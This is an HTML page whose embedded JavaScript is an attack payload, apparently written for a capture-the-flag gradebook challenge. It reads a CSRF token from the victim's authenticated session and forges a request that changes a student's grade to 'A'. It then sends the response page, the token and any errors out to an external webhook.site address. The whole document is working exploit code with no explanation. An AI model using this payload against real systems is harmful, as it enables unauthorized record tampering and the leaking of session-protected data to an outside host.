<!DOCTYPE html>
<html>
<body>
    <script>
        // First, fetch the grade-change page to get the CSRF token
        fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
            credentials: 'include'
        })
        .then(response => response.text())
        .then(html => {
            // Parse the HTML to extract the CSRF token
            const parser = new DOMParser();
            const doc = parser.parseFromString(html, 'text/html');
            const csrfInput = doc.querySelector('input[name="csrf_token"]');
            
            if (!csrfInput) {
                // Send the entire HTML to webhook for debugging
                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'csrf_token_not_found',
                        full_html: html,
                        message: 'CSRF token input not found in the GET response'
                    })
                });
                return;
            }
            
            const csrfToken = csrfInput.value;
            
            // Prepare the POST data
            const formData = new FormData();
            formData.append('student_id', 'cec61aee-395d-4281-af96-cfe05bda466e');
            formData.append('class_id', 'e522382b-7643-469c-ae52-ba488f5752c6');
            formData.append('grade', 'A');
            formData.append('csrf_token', csrfToken);

            // Send POST request to grade-change
            fetch('https://gradebook-app.ctf.csaw.io/grade-change', {
                method: 'POST',
                body: formData,
                credentials: 'include'
            })
            .then(response => response.text())
            .then(postResponseHtml => {
                // Send the entire POST response HTML to webhook
                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'post_response',
                        full_html: postResponseHtml,
                        csrf_token_used: csrfToken,
                        post_data: {
                            student_id: 'cec61aee-395d-4281-af96-cfe05bda466e',
                            class_id: 'e522382b-7643-469c-ae52-ba488f5752c6',
                            grade: 'A'
                        },
                        message: 'POST request completed'
                    })
                });
            })
            .catch(error => {
                // Send error to webhook
                fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        type: 'post_error',
                        error: error.toString(),
                        message: 'POST request failed'
                    })
                });
            });
        })
        .catch(error => {
            // Send error to webhook
            fetch('https://webhook.site/adba0a28-6810-4262-9e4e-08d620900ebb', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    type: 'get_error',
                    error: error.toString(),
                    message: 'GET request for CSRF token failed'
                })
            });
        });
    </script>
</body>
</html>
